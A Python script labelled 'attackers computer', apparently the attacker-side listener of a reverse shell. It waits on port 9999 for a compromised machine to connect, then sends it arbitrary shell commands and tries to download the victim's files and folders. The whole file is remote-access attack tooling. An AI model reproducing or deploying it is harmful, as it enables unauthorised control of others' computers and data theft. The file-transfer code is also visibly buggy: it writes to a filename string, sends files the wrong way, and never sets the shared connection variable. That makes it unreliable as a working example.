#attackers computer
#by baric

#library of comunitcating betwwen two computers
import socket
import sys
from os import system, chdir

host = "127.0.0.1"
port = 0000
s = socket
conn = None
files = None
file_names = None
additionalData = b'' 

#create socket
def socketCreate():
    try:
        global host
        global port
        global s
        
        #host is given the if y it left blank
        host = ""
        #port number 9999 is unused, stay away from well known ports ex.. 80, 22 ....
        port = 9999
        #lets the program comunicate with socket
        s = socket.socket()
        print("created socket")
        
    #when a error occures this will print    
    except socket.error as msg:
        print("socket creation error " + str(msg))  
        
#bind port to socket waits for connection from client
def socketBind():
    try:
        global host
        global port
        global s
        #print port connection
        print("binding socket to port " + str(port))
        #binds the ip and port number   
        s.bind((host, port))
        s.listen(5)#bad connections the refuse to connect 
        print("socket bound and listening")  
        
    #if bind broke print this message        
    except socket.error as msg:
        print("socket binding error " + str(msg) + "\n" + "Retrying...")    

#download file or dir==========================================================
def downloadFolder(dirz):
    global additionalData
    #we created a dir and go in it
    #we must know the file names in the dir
    if "" in files:
        files.remove("")
    print(files)  
    
    for file in files:
        with open(file, "wb") as f:
            if additionalData:
                f.write(additionalData)
                additionalData = None
            while True:
                data = conn.recv(1024)  
                if b'hmmn' in data:
                    file.write(data[:-4])  
                    break
                file.write(data)
                
def downloadFile(fileName):
    with open(fileName, "rb") as file:
        for data in file:
            #changed from conn.sendAll(data)
            conn.send(data)
        conn.send(b'hmmn')    
                         
#=============================================================      

#excepts connection
def socketAccept():
    #socket has to be listening in order to connect
    #address is a list the first part of the list is 
    #ip address == address[0]
    #port == address[1]
    
    #conn == actual connection
    
    #waits for connection to accept
    conn, address = s.accept()
    #when connected print this 
    print("Connection has been connected :: " + " IP: " + address[0] + " Port: " + str(address[1])) 
    #method that sends commands
    sendCommands(conn)
    #close connection
    conn.close()  
    
#input to send  
#when displaying print to user needs to be a string
#when sending over network needs to bytes  
def sendCommands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        #download file or dir
        #TODO    
        elif cmd.split()[0] == "download":
            if cmd.split()[1] == "-dir":
                try:
                    global files
                    name = cmd.split()[2]
                    system("mkdir {}".format(name))
                    chdir(name)
                    
                    #send cmd to client
                    conn.send(str.encode("ls {}".format(name)))
                    files = str(conn.recv(1024), "utf-8")
                    files = files.split("\n")
                    
                    print("folder Downloading.....")
                    conn.send(str.encode(cmd))
                    #method
                    downloadFolder(name)
                    #return to previous directory
                    chdir("..")
                    print("Download Complete")
                        
                except Exception as e:
                    print("folder broke")
                    print(e)    
            else:
                try:
                    name = cmd.split()[1]
                    print("Downloading .....")
                    downloadFile(name) 
                    print("file Download complete")
                except Exception as e:
                    print("file broke")
                    print(e)     
                       

        #making sure only send data if there is data to send    
        if len(str.encode(cmd)) > 0: 
            conn.send(str.encode(cmd)) 
            #conn.recv(1024) is the buffer size of recieved data in bytes
            clientResponce = str(conn.recv(1024), "utf-8") 
            #takes out the newline char, returns like termial
            print(clientResponce, end="")
                    

#method that calls all methods
def main():
    socketCreate()
    socketBind()
    socketAccept()  
   
#start    
main()             